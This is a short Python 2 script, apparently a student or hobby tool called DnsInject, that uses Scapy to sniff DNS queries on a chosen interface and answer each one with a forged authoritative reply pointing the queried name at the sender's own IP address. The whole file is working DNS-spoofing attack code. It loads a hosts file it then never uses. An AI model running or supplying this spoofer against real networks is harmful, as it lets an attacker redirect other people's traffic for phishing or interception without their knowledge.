#! /usr/bin/python

from scapy.all import *
from optparse import OptionParser
import socket

# http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib

class DnsInject:
    def __init__(self, interface, hosts, expression):
        self.interface = interface
        self.host = hosts
        self.expression = expression
        self.host_dict = {}
        self.parse_host()

    def parse_host(self):
        file = open(self.host, 'r')
        # check file exists or not
        for line in file.readlines():
            ip, address = line.split()
            self.host_dict[address] = ip
        file.close()

    def start_dnsspoof(self):

        def dns_callback(packet):
            local_ip = self.get_local_ip()
            if packet.haslayer(DNSQR):
                spoorfed_packet =  \
                    IP(dst=packet[IP].src,
                       src=packet[IP].dst) / \
                    UDP(dport=packet[UDP].sport,
                        sport=packet[UDP].dport) / \
                    DNS(id=packet[DNS].id,
                        qd=packet[DNS].qd,
                        aa=1,
                        qr=1, \
                        an=DNSRR(
                            rrname=packet[DNS].qd.qname,
                            ttl=10,
                            rdata=local_ip)
                    )
                send(spoorfed_packet)
                print 'Sent:', spoorfed_packet.summary()

        sniff(filter=self.expression,
              prn=dns_callback,
              store=0,
              iface=self.interface)

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return  s.getsockname()[0]

if __name__ == '__main__':
    optparser = OptionParser()
    optparser.set_conflict_handler("resolve")
    optparser.add_option("-i", "--interface", dest="interface", help="interface")
    optparser.add_option("-h", "--hosts", dest="hosts", help="file with a list of hosts")

    (options, args) = optparser.parse_args()
    expression = " ".join(args)

    dnsinject = DnsInject(options.interface,
                          options.hosts, expression)

    dnsinject.start_dnsspoof()
